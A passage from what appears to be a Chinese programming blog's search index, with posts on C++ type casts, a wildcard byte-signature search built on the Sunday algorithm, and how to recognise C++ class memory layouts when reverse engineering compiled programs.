class="hljs-number">5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> b = <span class="hljs-number">10</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span>* pCa = &amp;a;<br><span class="hljs-comment">// *p = 10;// 错误</span><br><span class="hljs-comment">// b= 20;// 错误</span><br><span class="hljs-type">int</span>* pa = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(pCa);<span class="hljs-comment">// 指针去const</span><br><span class="hljs-type">int</span>&amp; rb = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">int</span>&amp;&gt;(b);<span class="hljs-comment">// 引用去const</span><br><br>*pa = <span class="hljs-number">10</span>;<span class="hljs-comment">// 正确</span><br>rb = <span class="hljs-number">20</span>;<span class="hljs-comment">// 正确</span><br></code></pre></td></tr></table></figure></li><li><p>static_cast</p><p>与C风格强制类型转换基本一样，不存在运行时类型检查。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">float fVal1 <span class="hljs-operator">=</span> <span class="hljs-number">3.1415926</span>f<span class="hljs-comment">;</span><br>int dwVal2 <span class="hljs-operator">=</span> static_cast&lt;int&gt;(fVal1)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>dynamic_cast</p><p>具有运行时类型检查，可以防止在具有虚函数的派生关系中，将父类对象地址交给子类指针，会返回NULL。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">Base *base = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Base</span>();<br>Sub  *pSub = <span class="hljs-built_in">dynamic_cast</span>&lt;Sub*&gt;(base);<span class="hljs-comment">// 转换失败，此时pSub为NULL</span><br><span class="hljs-keyword">if</span>(pSub != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">// do something.</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>reinterpret_cast</p><p>对要转换的二进制流重新解释，常用于指针与整数之间的转换。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-title">Hash</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>&gt;(p);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>)(val ^ (val &gt;&gt; <span class="hljs-number">16</span>));<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特征码搜索</title>
      <link href="/2022/09/23/te-zheng-ma-sou-suo/"/>
      <url>/2022/09/23/te-zheng-ma-sou-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Sunday字符串搜索算法"><a href="#1-Sunday字符串搜索算法" class="headerlink" title="1.Sunday字符串搜索算法"></a>1.Sunday字符串搜索算法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">String2Bytes</span><span class="hljs-params">(<span class="hljs-type">char</span>* szSrc, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>* szDst)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br>WORD TzmLength = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)szSrc) / <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">//将十六进制特征码转为十进制</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)szSrc); )<br>&#123;<br><span class="hljs-type">char</span> num[<span class="hljs-number">2</span>];<br>num[<span class="hljs-number">0</span>] = szSrc[i++];<br>num[<span class="hljs-number">1</span>] = szSrc[i++];<br>i++;<br><span class="hljs-keyword">if</span> (num[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;?&#x27;</span> &amp;&amp; num[<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;?&#x27;</span>)<br>&#123;<br><span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>WORD a[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (num[i] &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; num[i] &lt;= <span class="hljs-string">&#x27;9&#x27;</span>)<br>&#123;<br>a[i] = num[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; num[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>&#123;<br>a[i] = num[i] - <span class="hljs-number">87</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; num[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)<br>&#123;<br>a[i] = num[i] - <span class="hljs-number">55</span>;<br>&#125;<br><br>&#125;<br>sum = a[<span class="hljs-number">0</span>] * <span class="hljs-number">16</span> + a[<span class="hljs-number">1</span>];<br>szDst[len++] = sum;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>szDst[len++] = <span class="hljs-number">256</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> TzmLength;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SundayStrSearch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* szSrc, <span class="hljs-type">char</span>* szDst, std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; vRes)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">size_t</span> sSrc = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)szSrc);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>* pDst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * (<span class="hljs-built_in">strlen</span>(szDst) / <span class="hljs-number">3</span> + <span class="hljs-number">1</span>));<br><span class="hljs-type">size_t</span> sDst = <span class="hljs-built_in">String2Bytes</span>(szDst, pDst);<br><br><span class="hljs-comment">// 构造Next数组</span><br><span class="hljs-type">short</span> szNext[<span class="hljs-number">260</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">260</span>; i++)<br>szNext[i] = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; sDst; i++)<br>szNext[pDst[i]] = i;<br><br><span class="hljs-comment">// 字符串匹配</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j, k; i &lt; sSrc;)<br>&#123;<br>j = i; k = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (; k &lt; sDst &amp;&amp; j &lt; sSrc &amp;&amp; (pDst[k] == szSrc[j] || pDst[k] == <span class="hljs-number">256</span>); k++, j++);<br><br><span class="hljs-keyword">if</span> (k == sDst)<br>&#123;<br>vRes.<span class="hljs-built_in">push_back</span>(i);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>)(i + sDst) &gt;= sSrc)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-type">int</span> num = szNext[szSrc[sDst + i]];<br><span class="hljs-keyword">if</span> (num == <span class="hljs-number">-1</span>)<br>i += (sDst - szNext[<span class="hljs-number">256</span>]);<br><span class="hljs-keyword">else</span><br>i += (sDst - num);<br>&#125;<br><span class="hljs-keyword">if</span> (pDst)<br>&#123;<br><span class="hljs-built_in">free</span>(pDst);<br>pDst = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pSrc[] = <br>&#123;<br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span><br>&#125;;<br><br>vector&lt;<span class="hljs-type">int</span>&gt; res;<br><span class="hljs-built_in">SundayStrSearch</span>(pSrc, <span class="hljs-string">&quot;88 ?? 67&quot;</span>, res);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; res.<span class="hljs-built_in">size</span>(); i++)<br>cout &lt;&lt; res[i] &lt;&lt; endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> lib </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++类逆向</title>
      <link href="/2022/09/14/class-reverse/"/>
      <url>/2022/09/14/class-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-对象内存布局"><a href="#1-对象内存布局" class="headerlink" title="1.对象内存布局"></a>1.对象内存布局</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span>: <span class="hljs-keyword">public</span> Base<br>&#123;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span><br>    &#123;<br>        <span class="hljs-comment">// 虚表指针</span><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Base_vtable</span>*<br>    <span class="hljs-comment">// 父类成员结构</span><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Base_member</span><br>        &#123;<br>            <span class="hljs-type">int</span> m_iVal1;<br>            <span class="hljs-type">char</span> m_cVal2;<br>        &#125;;<br>    &#125;;<br>    <span class="hljs-comment">// 子类自身成员结构</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A1_member</span><br>    &#123;<br>        <span class="hljs-type">float</span> m_fVal1;<br>        <span class="hljs-type">char</span>* m_pcVal2;<br>    &#125;;<br>&#125;;<br><br><span class="hljs-comment">// Base虚表结构</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base_vtable</span><br>&#123;<br>   int64 fun1;<br>   int64 fun2;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="1-1-基本类"><a href="#1-1-基本类" class="headerlink" title="1.1 基本类"></a>1.1 基本类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">char</span> y, <span class="hljs-type">short</span> z)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;x = x;<br><span class="hljs-keyword">this</span>-&gt;y = y;<br><span class="hljs-keyword">this</span>-&gt;z = z;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; x &lt;&lt; std::endl;<br>std::cout &lt;&lt; y &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">char</span> y;<br><span class="hljs-type">short</span> z;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-function">A1 <span class="hljs-title">a1</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>)</span></span>;<br>a1.<span class="hljs-built_in">show</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于基本类，从对象创建的地方找到构造函数，根据结构偏移使用情况来确定边界和成员类型，并在之后分析过程中不断修改完善。</p><p><strong>结构体定义模板</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914173617123.png" alt="基本结构模板"></p><h3 id="1-2-组合类"><a href="#1-2-组合类" class="headerlink" title="1.2 组合类"></a>1.2 组合类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A2</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A2</span>(<span class="hljs-type">float</span> x, <span class="hljs-type">float</span> y)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;x = x;<br><span class="hljs-keyword">this</span>-&gt;y = y;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">float</span> <span class="hljs-title">GetX</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> x;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">float</span> <span class="hljs-title">GetY</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> y;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">float</span> x;<br><span class="hljs-type">float</span> y;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">char</span> y, <span class="hljs-type">short</span> z)<br>:<span class="hljs-built_in">a2</span>(<span class="hljs-number">3.2</span>, <span class="hljs-number">4.3</span>)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;x = x;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;y[i] = i+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">this</span>-&gt;z = z;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; x &lt;&lt; std::endl;<br>std::cout &lt;&lt; y &lt;&lt; std::endl;<br><br>std::cout &lt;&lt; y[<span class="hljs-number">5</span>] &lt;&lt; std::endl;<br><br>std::cout &lt;&lt; a2.<span class="hljs-built_in">GetX</span>() &lt;&lt; std::endl;<br>std::cout &lt;&lt; a2.<span class="hljs-built_in">GetY</span>() &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">char</span> y[<span class="hljs-number">20</span>];<br><span class="hljs-type">short</span> z;<br>A2 a2;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-function">A1 <span class="hljs-title">a1</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>)</span></span>;<br>a1.<span class="hljs-built_in">show</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>组合类在分析的时候可以看见很明显的特征，就是在class1的构造函数中会将 this + x 的地址传入class2的构造函数中进行初始化，这个偏移x的位置就是class2的起始位置。</p><p><img src="/2022/09/14/class-reverse/image-20220914104738064.png" alt="组合类特征"></p><p><strong>结构体定义模板</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914173829653.png" alt="组合类结构模板"></p><h3 id="1-3-单继承类"><a href="#1-3-单继承类" class="headerlink" title="1.3 单继承类"></a>1.3 单继承类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A2</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A2</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> len)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;a = a;<br>b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">char</span>(len);<br><span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;Base&quot;</span>);<br>&#125;<br>~<span class="hljs-built_in">A2</span>()<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;b)<br>&#123;<br><span class="hljs-built_in">free</span>(<span class="hljs-keyword">this</span>-&gt;b);<br><span class="hljs-keyword">this</span>-&gt;b = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">char</span> *b;<br><span class="hljs-type">int</span> arr[<span class="hljs-number">5</span>];<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>: <span class="hljs-keyword">public</span> A2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">short</span> c)<br>:<span class="hljs-built_in">A2</span>(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;a = a;<br><span class="hljs-keyword">this</span>-&gt;c = c;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> key + b[<span class="hljs-number">3</span>] + b[<span class="hljs-number">5</span>] * arr[<span class="hljs-number">1</span>] / a + c;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">short</span> c;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-function">A1 <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)</span></span>;<br>std::cout &lt;&lt; a.<span class="hljs-built_in">encrypt</span>(<span class="hljs-number">10</span>) &lt;&lt; std::endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于继承关系的类识别，可以看构造函数中是否有将原始this指针直接传递给父类构造函数的操作。实际上在不含有虚函数的继承关系中，可以把子类和父类合并来看待。<strong>普通继承关系实际上就是把父类的成员原封不动的拷贝过来，作为子类对象结构开头的一部分。</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914113639610.png" alt="继承关系特征"></p><p><strong>结构体定义标准模板</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914165807726.png" alt="单继承结构模板"></p><h3 id="1-4-多继承类"><a href="#1-4-多继承类" class="headerlink" title="1.4 多继承类"></a>1.4 多继承类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TopBase</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">TopBase</span>(<span class="hljs-type">int</span> id, <span class="hljs-type">char</span>* name)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;dwId = id;<br><span class="hljs-keyword">this</span>-&gt;sName = name;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> dwId;<br><span class="hljs-type">char</span>* sName;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mid1</span><br>:<span class="hljs-keyword">public</span> TopBase<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Mid1</span>(<span class="hljs-type">int</span> age)<br>:<span class="hljs-built_in">TopBase</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;jack&quot;</span>)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;age = age;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mid2</span><br>:<span class="hljs-keyword">public</span> TopBase<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Mid2</span>(<span class="hljs-type">char</span> high)<br>:<span class="hljs-built_in">TopBase</span>(<span class="hljs-number">2</span>, 